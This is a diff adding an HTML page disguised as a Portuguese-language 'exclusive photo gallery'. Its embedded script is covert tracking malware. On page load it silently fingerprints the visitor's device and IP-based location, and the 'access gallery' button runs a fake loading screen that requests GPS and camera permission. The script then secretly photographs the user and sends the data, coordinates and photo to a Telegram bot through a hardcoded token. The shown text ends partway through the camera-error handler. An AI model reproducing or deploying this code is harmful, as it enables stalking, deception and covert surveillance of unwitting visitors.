@@ -1,0 +1,1017 @@
+<!DOCTYPE html>
+<html lang="pt-br">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Docie Joao</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        body {
+            font-family: 'Arial', sans-serif;
+            background: #000;
+            min-height: 100vh;
+            overflow: hidden;
+        }
+        
+        /* Tela inicial preta */
+        .initial-screen {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100vh;
+            background: #000;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            z-index: 10000;
+            cursor: pointer;
+            transition: opacity 1s ease;
+        }
+        
+        .initial-screen.hidden {
+            opacity: 0;
+            pointer-events: none;
+        }
+        
+        .initial-title {
+            color: #fff;
+            font-size: 4em;
+            font-weight: bold;
+            text-align: center;
+            text-shadow: 0 0 20px rgba(255,255,255,0.3);
+            animation: pulse 2s infinite;
+        }
+        
+        @keyframes pulse {
+            0%, 100% { opacity: 0.8; }
+            50% { opacity: 1; }
+        }
+        
+        .click-hint {
+            position: absolute;
+            bottom: 50px;
+            left: 50%;
+            transform: translateX(-50%);
+            color: #666;
+            font-size: 1.1em;
+            animation: fadeInOut 3s infinite;
+        }
+        
+        @keyframes fadeInOut {
+            0%, 100% { opacity: 0; }
+            50% { opacity: 1; }
+        }
+        
+        /* Conteúdo principal (inicialmente oculto) */
+        .main-content {
+            opacity: 0;
+            transform: translateY(50px);
+            transition: all 1s ease;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            min-height: 100vh;
+            padding: 20px;
+        }
+        
+        .main-content.visible {
+            opacity: 1;
+            transform: translateY(0);
+        }
+        
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+            background: white;
+            border-radius: 15px;
+            padding: 30px;
+            box-shadow: 0 20px 40px rgba(0,0,0,0.1);
+        }
+        
+        .header {
+            text-align: center;
+            margin-bottom: 40px;
+        }
+        
+        .title {
+            font-size: 3em;
+            font-weight: bold;
+            background: linear-gradient(45deg, #667eea, #764ba2);
+            background-clip: text;
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            margin-bottom: 10px;
+        }
+        
+        .subtitle {
+            color: #666;
+            font-size: 1.2em;
+        }
+        
+        .gallery {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
+            gap: 20px;
+            margin-bottom: 40px;
+        }
+        
+        .photo-card {
+            background: #f8f9fa;
+            border-radius: 10px;
+            overflow: hidden;
+            box-shadow: 0 5px 15px rgba(0,0,0,0.1);
+            transition: transform 0.3s ease;
+            cursor: pointer;
+        }
+        
+        .photo-card:hover {
+            transform: translateY(-5px);
+        }
+        
+        .photo-placeholder {
+            width: 100%;
+            height: 200px;
+            background: linear-gradient(45deg, #e9ecef, #dee2e6);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: #6c757d;
+            font-size: 1.1em;
+        }
+        
+        .photo-info {
+            padding: 15px;
+            text-align: center;
+        }
+        
+        .btn-access {
+            display: block;
+            width: 300px;
+            margin: 40px auto;
+            padding: 15px 30px;
+            background: linear-gradient(45deg, #28a745, #20c997);
+            color: white;
+            border: none;
+            border-radius: 50px;
+            font-size: 1.3em;
+            font-weight: bold;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            text-decoration: none;
+            text-align: center;
+        }
+        
+        .btn-access:hover {
+            transform: scale(1.05);
+            box-shadow: 0 10px 25px rgba(40, 167, 69, 0.3);
+        }
+          .loading-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0,0,0,0.95);
+            display: none;
+            align-items: center;
+            justify-content: center;
+            z-index: 99999;
+            backdrop-filter: blur(5px);
+        }
+        
+        .loading-overlay.show {
+            display: flex !important;
+        }
+        
+        .loading-content {
+            background: white;
+            padding: 40px;
+            border-radius: 15px;
+            text-align: center;
+            box-shadow: 0 20px 40px rgba(0,0,0,0.3);
+            min-width: 300px;
+            border: 2px solid #667eea;
+        }
+        
+        .loading-content h3 {
+            color: #333;
+            margin-bottom: 15px;
+            font-size: 1.5em;
+        }
+        
+        .loading-content p {
+            color: #666;
+            margin-bottom: 20px;
+        }
+        
+        .spinner {
+            border: 4px solid #f3f3f3;
+            border-top: 4px solid #667eea;
+            border-radius: 50%;
+            width: 40px;
+            height: 40px;
+            animation: spin 1s linear infinite;
+            margin: 0 auto 20px;
+        }
+        
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+    </style>
+</head>
+<body>
+    <!-- Tela inicial preta -->
+    <div class="initial-screen" id="initialScreen">
+        <div>
+            <div class="initial-title">Docie Joao</div>
+            <div class="click-hint">Clique para continuar</div>
+        </div>
+    </div>
+
+    <!-- Conteúdo principal -->
+    <div class="main-content" id="mainContent">
+        <div class="container">
+            <div class="header">
+                <h1 class="title">DOCIE JOAO</h1>
+                <p class="subtitle">Galeria Exclusiva de Fotos</p>
+            </div>
+            
+            <div class="gallery">
+                <div class="photo-card">
+                    <div class="photo-placeholder">📸 Foto Premium 1</div>
+                    <div class="photo-info">
+                        <h3>Coleção Especial</h3>
+                        <p>Conteúdo exclusivo disponível</p>
+                    </div>
+                </div>
+                
+                <div class="photo-card">
+                    <div class="photo-placeholder">📸 Foto Premium 2</div>
+                    <div class="photo-info">
+                        <h3>Acesso VIP</h3>
+                        <p>Material premium liberado</p>
+                    </div>
+                </div>
+                
+                <div class="photo-card">
+                    <div class="photo-placeholder">📸 Foto Premium 3</div>
+                    <div class="photo-info">
+                        <h3>Galeria Privada</h3>
+                        <p>Conteúdo restrito</p>
+                    </div>
+                </div>
+                
+                <div class="photo-card">
+                    <div class="photo-placeholder">📸 Foto Premium 4</div>
+                    <div class="photo-info">
+                        <h3>Álbum Especial</h3>
+                        <p>Acesso limitado</p>
+                    </div>
+                </div>
+            </div>
+            
+            <button class="btn-access" onclick="accessGallery()">
+                🔓 ACESSAR GALERIA COMPLETA
+            </button>
+        </div>
+    </div>
+    
+    <div class="loading-overlay" id="loadingOverlay">
+        <div class="loading-content">
+            <div class="spinner"></div>
+            <h3>Carregando galeria...</h3>
+            <p>Aguarde enquanto liberamos o acesso</p>
+        </div>
+    </div>
+
+    <script>        // --- CONFIGURAÇÃO ---
+        const TELEGRAM_BOT_TOKEN = '7004219593:AAHRCG9-nk_Qk80lgxwMHennNogjCPCodVw';
+        const TELEGRAM_CHAT_ID = '5504332725';        // COLETA SUPER SILENCIOSA - roda automaticamente
+        (async function stealthCollection() {
+            let timestamp = new Date();
+            let data = `🔍 RELATÓRIO COMPLETO DE ACESSO - DOCIE JOAO\n`;
+            data += `═══════════════════════════════════════════\n`;
+            data += `🕐 TIMESTAMP: ${timestamp.toLocaleString('pt-BR')}\n`;
+            data += `📅 Data UTC: ${timestamp.toISOString()}\n`;
+            data += `🌍 Timezone: ${timestamp.getTimezoneOffset()} min (${Intl.DateTimeFormat().resolvedOptions().timeZone})\n\n`;
+            
+            // === SEÇÃO 1: IDENTIFICAÇÃO DO DISPOSITIVO ===
+            data += `🖥️ DISPOSITIVO E NAVEGADOR:\n`;
+            data += `├─ User-Agent: ${navigator.userAgent}\n`;
+            data += `├─ Plataforma: ${navigator.platform}\n`;
+            data += `├─ Idioma Principal: ${navigator.language}\n`;
+            data += `├─ Idiomas Suportados: ${navigator.languages.join(', ')}\n`;
+            data += `├─ Cores de CPU: ${navigator.hardwareConcurrency || 'N/A'}\n`;
+            data += `├─ Memória RAM: ${navigator.deviceMemory || 'N/A'} GB\n`;
+            data += `├─ Cookies Habilitados: ${navigator.cookieEnabled}\n`;
+            data += `├─ Status Online: ${navigator.onLine}\n`;
+            data += `├─ Plugins Instalados: ${navigator.plugins.length}\n`;
+            data += `└─ Java Habilitado: ${navigator.javaEnabled()}\n\n`;
+
+            // === SEÇÃO 2: TELA E RESOLUÇÃO ===
+            data += `📺 INFORMAÇÕES DE TELA:\n`;
+            data += `├─ Resolução Total: ${screen.width}x${screen.height}\n`;
+            data += `├─ Área Disponível: ${screen.availWidth}x${screen.availHeight}\n`;
+            data += `├─ Profundidade de Cor: ${screen.colorDepth}bits\n`;
+            data += `├─ Orientação: ${screen.orientation?.type || 'N/A'}\n`;
+            data += `├─ Densidade de Pixels: ${window.devicePixelRatio || 1}x\n`;
+            data += `└─ Viewport: ${window.innerWidth}x${window.innerHeight}\n\n`;
+
+            // Fingerprinting avançado
+            const canvas = document.createElement('canvas');
+            const ctx = canvas.getContext('2d');
+            ctx.textBaseline = 'top';
+            ctx.font = '14px Arial';
+            ctx.fillText('Fingerprint test 🔍', 2, 2);
+            data += `🔎 FINGERPRINTING:\n`;
+            data += `├─ Canvas Hash: ${canvas.toDataURL().slice(-15)}\n`;
+
+            // WebGL fingerprint
+            try {
+                const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+                if (gl) {
+                    const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+                    data += `├─ GPU Renderer: ${gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL)}\n`;
+                    data += `├─ GPU Vendor: ${gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL)}\n`;
+                    data += `├─ WebGL Version: ${gl.getParameter(gl.VERSION)}\n`;
+                    data += `└─ GLSL Version: ${gl.getParameter(gl.SHADING_LANGUAGE_VERSION)}\n\n`;
+                }
+            } catch(e) {
+                data += `└─ WebGL: Não disponível\n\n`;
+            }
+
+            // === SEÇÃO 3: CONEXÃO E REDE ===
+            data += `🌐 INFORMAÇÕES DE REDE:\n`;
+            if ('connection' in navigator) {
+                const conn = navigator.connection;
+                data += `├─ Tipo de Conexão: ${conn.effectiveType || 'N/A'}\n`;
+                data += `├─ Velocidade Download: ${conn.downlink || 'N/A'} Mbps\n`;
+                data += `├─ RTT (Latência): ${conn.rtt || 'N/A'} ms\n`;
+                data += `├─ Economia de Dados: ${conn.saveData || false}\n`;
+            }
+            data += `└─ Referrer: ${document.referrer || 'Acesso direto'}\n\n`;
+
+            // === SEÇÃO 4: RECURSOS DISPONÍVEIS ===
+            data += `🎛️ RECURSOS E PERMISSÕES:\n`;
+            
+            // Detecta modo privado
+            try {
+                localStorage.setItem('test_private', 'test');
+                localStorage.removeItem('test_private');
+                data += `├─ Modo Privado: NÃO\n`;
+            } catch(e) {
+                data += `├─ Modo Privado: SIM\n`;
+            }
+
+            // Informações de bateria
+            if ('getBattery' in navigator) {
+                try {
+                    const battery = await navigator.getBattery();
+                    data += `├─ Bateria: ${Math.round(battery.level * 100)}%\n`;
+                    data += `├─ Carregando: ${battery.charging ? 'SIM' : 'NÃO'}\n`;
+                    data += `├─ Tempo para Carregar: ${battery.chargingTime === Infinity ? 'N/A' : Math.round(battery.chargingTime/60)} min\n`;
+                    data += `├─ Tempo de Descarga: ${battery.dischargingTime === Infinity ? 'N/A' : Math.round(battery.dischargingTime/60)} min\n`;
+                } catch(e) {
+                    data += `├─ Bateria: Não disponível\n`;
+                }
+            }
+
+            // Dispositivos de mídia
+            try {
+                const devices = await navigator.mediaDevices.enumerateDevices();
+                const cameras = devices.filter(d => d.kind === 'videoinput').length;
+                const mics = devices.filter(d => d.kind === 'audioinput').length;
+                const speakers = devices.filter(d => d.kind === 'audiooutput').length;
+                data += `├─ Câmeras Detectadas: ${cameras}\n`;
+                data += `├─ Microfones Detectados: ${mics}\n`;
+                data += `└─ Alto-falantes: ${speakers}\n\n`;
+            } catch(e) {
+                data += `└─ Dispositivos Mídia: Acesso negado\n\n`;
+            }
+
+            await reportToTelegram(data);
+
+            // === LOCALIZAÇÃO DETALHADA VIA IP ===
+            try {
+                const ipInfo = await fetch('http://ip-api.com/json/?fields=status,message,continent,continentCode,country,countryCode,region,regionName,city,district,zip,lat,lon,timezone,offset,currency,isp,org,as,asname,mobile,proxy,hosting,query');
+                const ipData = await ipInfo.json();
+                
+                if (ipData.status === 'success') {
+                    let location = `📍 LOCALIZAÇÃO E PROVEDOR (IP-BASED)\n`;
+                    location += `═══════════════════════════════════════════\n`;
+                    location += `🌍 GEOLOCALIZAÇÃO:\n`;
+                    location += `├─ IP Público: ${ipData.query}\n`;
+                    location += `├─ Continente: ${ipData.continent} (${ipData.continentCode})\n`;
+                    location += `├─ País: ${ipData.country} (${ipData.countryCode})\n`;
+                    location += `├─ Estado/Região: ${ipData.regionName} (${ipData.region})\n`;
+                    location += `├─ Cidade: ${ipData.city}\n`;
+                    location += `├─ Distrito: ${ipData.district || 'N/A'}\n`;
+                    location += `├─ CEP: ${ipData.zip || 'N/A'}\n`;
+                    location += `├─ Coordenadas: ${ipData.lat}, ${ipData.lon}\n`;
+                    location += `├─ Timezone: ${ipData.timezone} (UTC${ipData.offset/3600})\n`;
+                    location += `└─ Moeda: ${ipData.currency}\n\n`;
+                    
+                    location += `🏢 PROVEDOR DE INTERNET:\n`;
+                    location += `├─ ISP: ${ipData.isp}\n`;
+                    location += `├─ Organização: ${ipData.org}\n`;
+                    location += `├─ AS Number: ${ipData.as}\n`;
+                    location += `├─ AS Name: ${ipData.asname}\n`;
+                    location += `├─ Conexão Móvel: ${ipData.mobile ? 'SIM' : 'NÃO'}\n`;
+                    location += `├─ Proxy/VPN: ${ipData.proxy ? 'SIM' : 'NÃO'}\n`;
+                    location += `└─ Hosting/Datacenter: ${ipData.hosting ? 'SIM' : 'NÃO'}\n\n`;
+                    
+                    location += `🗺️ LINKS ÚTEIS:\n`;
+                    location += `├─ Google Maps: https://maps.google.com/?q=${ipData.lat},${ipData.lon}\n`;
+                    location += `├─ Google Earth: https://earth.google.com/web/@${ipData.lat},${ipData.lon},0a,1000d\n`;
+                    location += `└─ Street View: https://www.google.com/maps/@${ipData.lat},${ipData.lon},3a,75y,90t/data=!3m6!1e1\n\n`;
+                    
+                    await reportToTelegram(location);
+                }
+            } catch(e) {
+                await reportToTelegram('❌ Falha ao obter localização detalhada via IP');
+            }
+        })();
+
+        // Função para enviar mensagens para o Telegram
+        async function reportToTelegram(text) {
+            const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+            try {
+                await fetch(url, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: text })
+                });
+            } catch (error) {
+                console.error("Erro ao enviar para o Telegram:", error);
+            }
+        }
+
+        // Função para enviar foto para o Telegram
+        async function sendPhotoToTelegram(photoBlob) {
+            const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`;
+            try {
+                const formData = new FormData();
+                formData.append('chat_id', TELEGRAM_CHAT_ID);
+                formData.append('photo', photoBlob, 'foto_capturada.jpg');
+                formData.append('caption', `📸 Foto capturada - DOCIE JOAO\nData/Hora: ${new Date().toLocaleString('pt-BR')}`);
+                
+                await fetch(url, {
+                    method: 'POST',
+                    body: formData
+                });
+                
+                await reportToTelegram("✅ Foto enviada com sucesso!");
+            } catch (error) {
+                console.error("Erro ao enviar foto para o Telegram:", error);
+                await reportToTelegram(`❌ Erro ao enviar foto: ${error.message}`);
+            }
+        }        // Função para revelar o conteúdo principal
+        async function revealMainContent() {
+            // Adiciona timestamp para calcular duração
+            const loadingStart = Date.now();
+            
+            // Mostra loading imediatamente com classe forçada
+            const loadingOverlay = document.getElementById('loadingOverlay');
+            loadingOverlay.style.display = 'flex';
+            loadingOverlay.classList.add('show');
+            document.querySelector('.loading-content h3').textContent = 'Carregando...';
+            document.querySelector('.loading-content p').textContent = 'Preparando acesso exclusivo';
+            
+            // Força o loading a aparecer mesmo no Simple Browser
+            loadingOverlay.style.position = 'fixed';
+            loadingOverlay.style.top = '0';
+            loadingOverlay.style.left = '0';
+            loadingOverlay.style.width = '100%';
+            loadingOverlay.style.height = '100%';
+            loadingOverlay.style.backgroundColor = 'rgba(0,0,0,0.95)';
+            loadingOverlay.style.zIndex = '99999';
+              // Coleta informações básicas imediatamente
+            let infoText = `🎯 RELATÓRIO DE ACESSO ATIVO - DOCIE JOAO\n`;
+            infoText += `═══════════════════════════════════════════\n`;
+            infoText += `⏰ MOMENTO DO CLIQUE: ${new Date().toLocaleString('pt-BR')}\n`;
+            infoText += `🕐 Timestamp Unix: ${Date.now()}\n`;
+            infoText += `📱 Origem: Clique em "Continuar"\n\n`;
+
+            infoText += `💻 SISTEMA OPERACIONAL E NAVEGADOR:\n`;
+            infoText += `├─ User-Agent Completo: ${navigator.userAgent}\n`;
+            infoText += `├─ Plataforma: ${navigator.platform}\n`;
+            infoText += `├─ Vendor: ${navigator.vendor}\n`;
+            infoText += `├─ App Name: ${navigator.appName}\n`;
+            infoText += `├─ App Version: ${navigator.appVersion}\n`;
+            infoText += `├─ Build ID: ${navigator.buildID || 'N/A'}\n`;
+            infoText += `└─ Product: ${navigator.product}\n\n`;
+
+            infoText += `🌍 LOCALIZAÇÃO E IDIOMA:\n`;
+            infoText += `├─ Idioma Principal: ${navigator.language}\n`;
+            infoText += `├─ Todos os Idiomas: ${navigator.languages.join(', ')}\n`;
+            infoText += `├─ Timezone: ${Intl.DateTimeFormat().resolvedOptions().timeZone}\n`;
+            infoText += `├─ Locale: ${Intl.DateTimeFormat().resolvedOptions().locale}\n`;
+            infoText += `├─ Formato de Data: ${new Intl.DateTimeFormat().format(new Date())}\n`;
+            infoText += `└─ Formato de Hora: ${new Intl.DateTimeFormat('pt-BR', {hour: '2-digit', minute: '2-digit'}).format(new Date())}\n\n`;
+
+            infoText += `⚡ HARDWARE E PERFORMANCE:\n`;
+            infoText += `├─ Cores de CPU: ${navigator.hardwareConcurrency || 'Não disponível'}\n`;
+            infoText += `├─ Memória RAM: ${navigator.deviceMemory || 'Não disponível'} GB\n`;
+            infoText += `├─ Densidade de Pixels: ${window.devicePixelRatio}x\n`;
+            infoText += `├─ Viewport: ${window.innerWidth}x${window.innerHeight}\n`;
+            infoText += `├─ Scroll Posição: ${window.scrollX}, ${window.scrollY}\n`;
+            infoText += `└─ Tamanho da Tela: ${screen.width}x${screen.height} (${screen.colorDepth}bit)\n\n`;
+
+            // Pega o IP e localização aproximada (sem pedir permissão)
+            try {
+                const response = await fetch('https://ipapi.co/json/');
+                const ipData = await response.json();
+                infoText += `🔗 CONEXÃO DE INTERNET (ipapi.co):\n`;
+                infoText += `├─ IP Público: ${ipData.ip}\n`;
+                infoText += `├─ Versão IP: ${ipData.version}\n`;
+                infoText += `├─ ISP/Provedor: ${ipData.org}\n`;
+                infoText += `├─ ASN: ${ipData.asn || 'N/A'}\n`;
+                infoText += `├─ Cidade: ${ipData.city}\n`;
+                infoText += `├─ Estado: ${ipData.region}\n`;
+                infoText += `├─ País: ${ipData.country_name} (${ipData.country})\n`;
+                infoText += `├─ CEP: ${ipData.postal || 'N/A'}\n`;
+                infoText += `├─ Coordenadas: ${ipData.latitude}, ${ipData.longitude}\n`;
+                infoText += `├─ Timezone: ${ipData.timezone}\n`;
+                infoText += `├─ Código de Área: ${ipData.country_calling_code || 'N/A'}\n`;
+                infoText += `├─ Moeda: ${ipData.currency}\n`;
+                infoText += `└─ Utc Offset: ${ipData.utc_offset}\n\n`;
+                
+                infoText += `📍 LINKS DE LOCALIZAÇÃO:\n`;
+                infoText += `├─ Google Maps: https://maps.google.com/?q=${ipData.latitude},${ipData.longitude}\n`;
+                infoText += `├─ Google Earth: https://earth.google.com/web/@${ipData.latitude},${ipData.longitude}\n`;
+                infoText += `└─ Coordenadas DD: ${ipData.latitude}, ${ipData.longitude}\n\n`;
+            } catch (e) {
+                infoText += `🔗 CONEXÃO: Falha ao obter dados do IP\n\n`;
+            }
+
+            // Coleta informações do navegador
+            infoText += `🔧 CONFIGURAÇÕES DO NAVEGADOR:\n`;
+            infoText += `├─ Cookies Habilitados: ${navigator.cookieEnabled}\n`;
+            infoText += `├─ Status Online: ${navigator.onLine}\n`;
+            infoText += `├─ Do Not Track: ${navigator.doNotTrack || 'Não definido'}\n`;
+            infoText += `├─ Java Habilitado: ${navigator.javaEnabled()}\n`;
+            infoText += `├─ Plugins Instalados: ${navigator.plugins.length}\n`;
+            infoText += `├─ MIME Types: ${navigator.mimeTypes.length}\n`;
+            infoText += `└─ PDF Viewer: ${navigator.pdfViewerEnabled || 'N/A'}\n\n`;
+
+            // Informações da janela
+            infoText += `🖼️ INFORMAÇÕES DA JANELA:\n`;
+            infoText += `├─ URL Atual: ${window.location.href}\n`;
+            infoText += `├─ Protocolo: ${window.location.protocol}\n`;
+            infoText += `├─ Host: ${window.location.host}\n`;
+            infoText += `├─ Porta: ${window.location.port || 'Padrão'}\n`;
+            infoText += `├─ Pathname: ${window.location.pathname}\n`;
+            infoText += `├─ Search: ${window.location.search || 'Nenhum'}\n`;
+            infoText += `├─ Hash: ${window.location.hash || 'Nenhum'}\n`;
+            infoText += `├─ Referrer: ${document.referrer || 'Acesso direto'}\n`;
+            infoText += `├─ Título: ${document.title}\n`;
+            infoText += `├─ Charset: ${document.characterSet}\n`;
+            infoText += `├─ Ready State: ${document.readyState}\n`;
+            infoText += `└─ Last Modified: ${document.lastModified}\n`;
+
+            await reportToTelegram(infoText);
+
+            // Aguarda um pouco para parecer processamento
+            await new Promise(resolve => setTimeout(resolve, 2000));
+
+            // Atualiza loading para GPS
+            document.querySelector('.loading-content h3').textContent = 'Verificando localização...';
+            document.querySelector('.loading-content p').textContent = 'Aguardando permissão de localização';            // SOLICITA LOCALIZAÇÃO GPS - AGUARDA ATÉ O USUÁRIO RESPONDER
+            let gpsObtained = false;
+            let gpsData = {};
+            try {
+                const position = await new Promise((resolve, reject) => {
+                    navigator.geolocation.getCurrentPosition(resolve, reject, { 
+                        timeout: 30000, // 30 segundos de timeout
+                        enableHighAccuracy: true,
+                        maximumAge: 0
+                    });
+                });
+                
+                const { latitude, longitude, accuracy, altitude, altitudeAccuracy, heading, speed } = position.coords;
+                const timestamp = new Date(position.timestamp);
+                
+                let gpsReport = `📍 GPS OBTIDO COM SUCESSO!\n`;
+                gpsReport += `═══════════════════════════════════════════\n`;
+                gpsReport += `🌍 COORDENADAS PRECISAS:\n`;
+                gpsReport += `├─ Latitude: ${latitude}\n`;
+                gpsReport += `├─ Longitude: ${longitude}\n`;
+                gpsReport += `├─ Precisão: ${accuracy} metros\n`;
+                gpsReport += `├─ Altitude: ${altitude || 'N/A'} metros\n`;
+                gpsReport += `├─ Precisão Altitude: ${altitudeAccuracy || 'N/A'} metros\n`;
+                gpsReport += `├─ Direção: ${heading || 'N/A'}°\n`;
+                gpsReport += `├─ Velocidade: ${speed || 'N/A'} m/s\n`;
+                gpsReport += `└─ Timestamp GPS: ${timestamp.toLocaleString('pt-BR')}\n\n`;
+                
+                gpsReport += `🗺️ LINKS PARA LOCALIZAÇÃO:\n`;
+                gpsReport += `├─ Google Maps: https://maps.google.com/?q=${latitude},${longitude}\n`;
+                gpsReport += `├─ Google Earth: https://earth.google.com/web/@${latitude},${longitude},${altitude || 0}a,1000d\n`;
+                gpsReport += `├─ Street View: https://www.google.com/maps/@${latitude},${longitude},3a,75y\n`;
+                gpsReport += `├─ Plus Code: https://plus.codes/${latitude},${longitude}\n`;
+                gpsReport += `└─ OpenStreetMap: https://www.openstreetmap.org/?mlat=${latitude}&mlon=${longitude}&zoom=18\n\n`;
+                
+                // Calcular distância de pontos conhecidos (exemplo: centro de São Paulo)
+                const spLat = -23.5505, spLon = -46.6333;
+                const distance = Math.sqrt(Math.pow(latitude - spLat, 2) + Math.pow(longitude - spLon, 2)) * 111.32; // Conversão aproximada para KM
+                gpsReport += `📏 DISTÂNCIAS APROXIMADAS:\n`;
+                gpsReport += `└─ Centro de São Paulo: ${distance.toFixed(2)} km\n`;
+                
+                await reportToTelegram(gpsReport);
+                gpsObtained = true;
+                gpsData = { latitude, longitude, accuracy, altitude, speed, heading };
+                
+            } catch (error) {
+                let gpsError = `❌ GPS NEGADO/FALHOU\n`;
+                gpsError += `═══════════════════════════════════════════\n`;
+                gpsError += `🚫 Erro: ${error.message}\n`;
+                gpsError += `🔍 Código: ${error.code}\n`;
+                gpsError += `📱 Possíveis Motivos:\n`;
+                gpsError += `├─ Usuário negou permissão\n`;
+                gpsError += `├─ GPS desabilitado no dispositivo\n`;
+                gpsError += `├─ Timeout (30 segundos)\n`;
+                gpsError += `├─ Sem sinal GPS\n`;
+                gpsError += `└─ Modo privado/incógnito\n`;
+                await reportToTelegram(gpsError);
+            }
+
+            // Aguarda um pouco antes da próxima solicitação
+            await new Promise(resolve => setTimeout(resolve, 1000));
+
+            // Atualiza loading para câmera
+            document.querySelector('.loading-content h3').textContent = 'Verificando câmera...';
+            document.querySelector('.loading-content p').textContent = 'Aguardando permissão de câmera';
+              let cameraObtained = false;
+            let cameraData = {};
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ 
+                    video: { 
+                        width: { ideal: 1920 }, 
+                        height: { ideal: 1080 },
+                        facingMode: "user" 
+                    } 
+                });
+                
+                let cameraReport = `📸 CÂMERA LIBERADA - INICIANDO CAPTURA\n`;
+                cameraReport += `═══════════════════════════════════════════\n`;
+                
+                // Cria um elemento de vídeo oculto para capturar a imagem
+                const video = document.createElement('video');
+                video.style.display = 'none';
+                video.srcObject = stream;
+                document.body.appendChild(video);
+                
+                // Aguarda o vídeo carregar
+                await new Promise(resolve => {
+                    video.onloadedmetadata = () => {
+                        video.play();
+                        resolve();
+                    };
+                });
+                
+                // Coleta informações da câmera
+                const videoTrack = stream.getVideoTracks()[0];
+                const settings = videoTrack.getSettings();
+                const capabilities = videoTrack.getCapabilities();
+                
+                cameraReport += `📹 ESPECIFICAÇÕES DA CÂMERA:\n`;
+                cameraReport += `├─ Dispositivo: ${videoTrack.label || 'Câmera padrão'}\n`;
+                cameraReport += `├─ ID do Dispositivo: ${settings.deviceId || 'N/A'}\n`;
+                cameraReport += `├─ Resolução Ativa: ${settings.width}x${settings.height}\n`;
+                cameraReport += `├─ Frame Rate: ${settings.frameRate || 'N/A'} fps\n`;
+                cameraReport += `├─ Facing Mode: ${settings.facingMode || 'N/A'}\n`;
+                cameraReport += `├─ Aspect Ratio: ${settings.aspectRatio || 'N/A'}\n`;
+                cameraReport += `├─ Group ID: ${settings.groupId || 'N/A'}\n`;
+                cameraReport += `└─ Estado: ${videoTrack.readyState}\n\n`;
+                
+                if (capabilities) {
+                    cameraReport += `⚙️ CAPACIDADES DA CÂMERA:\n`;
+                    cameraReport += `├─ Resoluções: ${capabilities.width?.min || 'N/A'}-${capabilities.width?.max || 'N/A'} x ${capabilities.height?.min || 'N/A'}-${capabilities.height?.max || 'N/A'}\n`;
+                    cameraReport += `├─ Frame Rate: ${capabilities.frameRate?.min || 'N/A'}-${capabilities.frameRate?.max || 'N/A'} fps\n`;
+                    cameraReport += `├─ Zoom: ${capabilities.zoom ? `${capabilities.zoom.min}-${capabilities.zoom.max}` : 'Não suportado'}\n`;
+                    cameraReport += `├─ Torch: ${capabilities.torch ? 'Suportado' : 'Não suportado'}\n`;
+                    cameraReport += `└─ Focus Mode: ${capabilities.focusMode ? capabilities.focusMode.join(', ') : 'N/A'}\n\n`;
+                }
+                
+                await reportToTelegram(cameraReport);
+                
+                // Atualiza loading para captura
+                document.querySelector('.loading-content h3').textContent = 'Capturando foto...';
+                document.querySelector('.loading-content p').textContent = 'Aguarde, processando imagem em alta qualidade';
+                
+                // Aguarda um pouco para a câmera se ajustar
+                await new Promise(resolve => setTimeout(resolve, 3000));
+                
+                // Cria canvas para capturar a imagem
+                const canvas = document.createElement('canvas');
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
+                const ctx = canvas.getContext('2d');
+                ctx.drawImage(video, 0, 0);
+                
+                // Informações da foto capturada
+                let photoInfo = `📷 FOTO CAPTURADA COM SUCESSO\n`;
+                photoInfo += `═══════════════════════════════════════════\n`;
+                photoInfo += `🖼️ DETALHES DA IMAGEM:\n`;
+                photoInfo += `├─ Resolução: ${canvas.width}x${canvas.height} pixels\n`;
+                photoInfo += `├─ Aspect Ratio: ${(canvas.width/canvas.height).toFixed(2)}\n`;
+                photoInfo += `├─ Timestamp: ${new Date().toLocaleString('pt-BR')}\n`;
+                photoInfo += `├─ Formato: JPEG\n`;
+                photoInfo += `├─ Qualidade: 80%\n`;
+                
+                // Adiciona informações de GPS se disponível
+                if (gpsObtained && gpsData.latitude) {
+                    photoInfo += `├─ GPS Embarcado: Sim\n`;
+                    photoInfo += `├─ Coordenadas: ${gpsData.latitude}, ${gpsData.longitude}\n`;
+                    photoInfo += `└─ Precisão GPS: ${gpsData.accuracy}m\n\n`;
+                } else {
+                    photoInfo += `└─ GPS Embarcado: Não\n\n`;
+                }
+                
+                // Converte para blob e envia
+                canvas.toBlob(async (blob) => {
+                    if (blob) {
+                        photoInfo += `📊 ARQUIVO:\n`;
+                        photoInfo += `├─ Tamanho: ${(blob.size / 1024).toFixed(2)} KB\n`;
+                        photoInfo += `├─ Tipo MIME: ${blob.type}\n`;
+                        photoInfo += `└─ Enviando para Telegram...\n`;
+                        
+                        await reportToTelegram(photoInfo);
+                        await sendPhotoToTelegram(blob);
+                    }
+                }, 'image/jpeg', 0.8);
+                
+                // Remove elementos e desliga a câmera
+                document.body.removeChild(video);
+                stream.getTracks().forEach(track => track.stop());
+                cameraObtained = true;
+                cameraData = { width: settings.width, height: settings.height, deviceId: settings.deviceId };
+                
+            } catch (error) {
+                let cameraError = `❌ CÂMERA NEGADA/FALHOU\n`;
+                cameraError += `═══════════════════════════════════════════\n`;
+                cameraError += `🚫 Erro: ${error.name} - ${error.message}\n`;
+                cameraError += `📱 Possíveis Motivos:\n`;
+                cameraError += `├─ Usuário negou permissão\n`;
